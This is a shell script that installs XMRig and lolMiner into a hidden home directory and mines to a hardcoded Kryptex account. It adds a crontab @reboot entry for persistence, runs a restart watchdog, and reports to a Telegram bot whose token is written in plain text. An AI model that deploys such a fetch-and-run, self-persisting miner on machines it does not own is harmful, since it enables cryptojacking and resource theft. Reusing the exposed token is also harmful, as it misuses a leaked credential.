#!/bin/sh

#################################################
# STABLE MINING AGENT (FIXED)
# CPU: XMR (XMRig, Kryptex)
# GPU: ETC (lolMiner, Kryptex)
#################################################

[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

### ===== BASIC =====
HOST="$(hostname)"
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG"

### ===== KRYPTEX =====
KRIPTEX_USER="krxX3PVQVR"
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"
ETC_WORKER="krxX3PVQVR.worker"

### ===== TELEGRAM =====
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT="5336452267"

tg() {
  curl -fsS --connect-timeout 10 \
    -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
    -d chat_id="$TG_CHAT" \
    --data-urlencode text="$1" >/dev/null 2>&1 || true
}

# ---- wait network ----
sleep 15

#################################################
# INSTALLERS (ALWAYS REINSTALL)
#################################################

install_xmrig() {
  tg "📦 [$HOST] Установка XMRig"
  pkill xmrig 2>/dev/null || true
  rm -f "$BIN/cpu/xmrig"

  wget -q https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz -O /tmp/xmr.tgz || return 1
  tar -xzf /tmp/xmr.tgz -C "$BIN/cpu" --strip-components=1 || return 1
  chmod +x "$BIN/cpu/xmrig"
  tg "✅ [$HOST] XMRig установлен"
}

install_lolminer() {
  tg "📦 [$HOST] Установка lolMiner"
  pkill lolMiner 2>/dev/null || true
  rm -f "$BIN/gpu/lolMiner"

  wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz -O /tmp/lol.tgz || return 1
  tar -xzf /tmp/lol.tgz -C "$BIN/gpu" --strip-components=1 || return 1
  chmod +x "$BIN/gpu/lolMiner"
  tg "✅ [$HOST] lolMiner установлен"
}

#################################################
# CPU — XMR
#################################################

start_cpu() {
  pkill xmrig 2>/dev/null || true
  "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX_USER.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/cpu.log" 2>&1 &
  echo $! > "$RUN/cpu.pid"
  tg "⚙️ [$HOST] CPU XMR запущен"
}

cpu_hr() {
  curl -s http://127.0.0.1:16000/1/summary \
    | grep -oE '"total":\[[^]]+' \
    | grep -oE '[0-9]+' | head -1 || echo 0
}

#################################################
# GPU — ETC
#################################################

start_gpu() {
  pkill lolMiner 2>/dev/null || true
  "$BIN/gpu/lolMiner" \
    --algo ETCHASH \
    --pool "$ETC_POOL" \
    --user "$ETC_WORKER" \
    --pass x \
    --ethstratum ETCPROXY \
    --disable-dag-verify \
    --apihost 127.0.0.1 --apiport 8080 \
    >> "$LOG/gpu.log" 2>&1 &
  echo $! > "$RUN/gpu.pid"
  tg "🔥 [$HOST] GPU ETC запущен"
}

gpu_hr() {
  curl -s http://127.0.0.1:8080/summary \
    | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' \
    | grep -oE '[0-9]+(\.[0-9]+)?' || echo 0
}

#################################################
# AUTOSTART
#################################################

enable_autostart() {
  crontab -l 2>/dev/null | grep -q min1.sh || \
    (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min1.sh") | crontab -
}

#################################################
# WATCHDOG
#################################################

watchdog() {
  [ -f "$RUN/cpu.pid" ] || { start_cpu; tg "♻️ [$HOST] CPU перезапуск"; }
  [ -f "$RUN/gpu.pid" ] || { start_gpu; tg "♻️ [$HOST] GPU перезапуск"; }

  GPU="$(gpu_hr)"
  if [ "$(printf "%.0f" "$GPU")" -eq 0 ]; then
    start_gpu
    tg "⚠️ [$HOST] ETC хешрейт 0 → GPU рестарт"
  fi
}

#################################################
# MAIN
#################################################

tg "🚀 [$HOST] Старт установки майнинга"
install_xmrig || tg "❌ [$HOST] Ошибка XMRig"
install_lolminer || tg "❌ [$HOST] Ошибка lolMiner"
enable_autostart
start_cpu
start_gpu
tg "✅ [$HOST] Майнинг запущен и под watchdog"

while true; do
  watchdog
  sleep 30
done
